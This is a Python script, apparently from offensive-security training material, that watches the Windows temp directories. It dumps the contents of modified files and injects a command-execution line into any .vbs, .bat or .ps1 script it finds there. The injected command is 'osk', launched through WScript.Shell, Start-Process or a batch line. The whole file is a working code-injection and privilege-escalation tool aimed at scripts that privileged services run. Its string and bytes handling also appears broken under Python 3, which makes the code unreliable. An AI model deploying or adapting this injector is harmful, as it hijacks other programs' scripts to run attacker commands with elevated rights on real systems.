import tempfile
import threading
import win32file
import win32con
import os

dirs_to_monitor = ["C:\\WINDOWS\\Temp",tempfile.gettempdir()]

FILE_CREATED =      1
FILE_DELETED =      2
FILE_MODIFIED =     3
FILE_RENAMED_FORM = 4
FILE_RENAMED_TO =   5
file_types = {}
command = "osk"
file_types['.vbs'] = ["\r\n'bhpmarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
file_types['.bat'] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
file_types['.ps1'] = ["\r\n#bhpmarker", "Start-Process \"%s\"\r\n" % command]

def inject_code(full_filename, extension, contents):
    if file_types[extension][0] in contents:
        return
    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents
    fd = open(full_filename, 'wb')
    fd.write(full_contents)
    fd.close()
    print('[\o/] Injected code.')
    return
def start_monitor(path_to_watch):
    FILE_LIST_DIRECTORY = 0x0001
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None)
    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME | win32con.FILE_NOTIFY_CHANGE_DIR_NAME | win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE | win32con.FILE_NOTIFY_CHANGE_LAST_WRITE | win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
                )
            for action,file_name in results:
                full_filename = os.path.join(path_to_watch,file_name)
                if action == FILE_CREATED:
                    print("[ + ] Created %s" % full_filename)
                elif action == FILE_DELETED:
                    print("[ - ] Deleted %s" % full_filename)
                elif action == FILE_MODIFIED:
                    print("[ * ] Modified %s" % full_filename)
                    print('[vvv] Dumping contents...')
                    try:
                        fd = open(full_filename,'rb')
                        content = fd.read()
                        fd.close()
                        print(content)
                        print('[^^^] Dump complete.')
                        filename, extension = os.path.splitext(full_filename)
                        if extension in file_types:
                            inject_code(full_filename, extension, content)
                    except:
                        print('[!!!] Failed.')
                elif action == FILE_RENAMED_FORM:
                    print("[ > ] Renamed from: %s" % full_filename)
                elif action == FILE_RENAMED_TO:
                    print("[ < ] Renamed to: %s" % full_filename)
                else:
                    print("[???] Unknown: %s" % full_filename)
        except:
            pass
for path in dirs_to_monitor:
    monitor_thread = threading.Thread(target=start_monitor,args=(path,))
    print('Spawning monitoring thread for path: %s' % path)
    monitor_thread.start()